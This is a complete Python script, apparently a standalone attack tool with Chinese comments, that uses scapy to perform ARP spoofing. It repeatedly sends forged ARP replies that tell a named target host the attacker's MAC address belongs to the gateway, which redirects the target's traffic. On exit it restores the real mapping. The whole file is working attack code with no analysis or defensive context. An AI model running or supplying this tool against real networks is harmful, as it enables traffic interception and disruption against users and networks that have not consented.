from scapy.all import Ether, ARP, sendp, get_if_hwaddr, getmacbyip
import time
import sys
import signal

# --- 1. 配置信息 ---
target_ip = "192.168.2.32"  # 目标机器（被攻击者）
gateway_ip = "192.168.2.11" # 想要伪装成的对象（通常是网关）
iface_name = "ens160"       # 你的网卡名称

def start_attack():
    print(f"[*] 正在获取 {target_ip} 和 {gateway_ip} 的 MAC 地址...")
    
    # 获取本地和目标的 MAC
    local_mac = get_if_hwaddr(iface_name)
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[-] 错误：无法获取 MAC 地址，请检查 IP 是否在线。")
        return

    # 构造欺骗包：告诉目标，gateway_ip 的 MAC 是我的 local_mac
    # op=2 表示 ARP 响应
    spoof_pkt = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=local_mac, pdst=target_ip, hwdst=target_mac)

    # 构造恢复包：告诉目标，gateway_ip 的 MAC 是它原本真正的 gateway_mac
    restore_pkt = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)

    # 定义按下 Ctrl+C 时的操作
    def signal_handler(sig, frame):
        print("\n[*] 正在停止攻击，恢复网络中...")
        sendp(restore_pkt, iface=iface_name, count=5, verbose=False) # 发 5 次确保成功
        print("[+] 恢复成功，程序退出。")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    print(f"[+] 正在欺骗 {target_ip}... (按 Ctrl+C 停止)")
    
    # 循环发送欺骗包
    while True:
        sendp(spoof_pkt, iface=iface_name, verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    start_attack()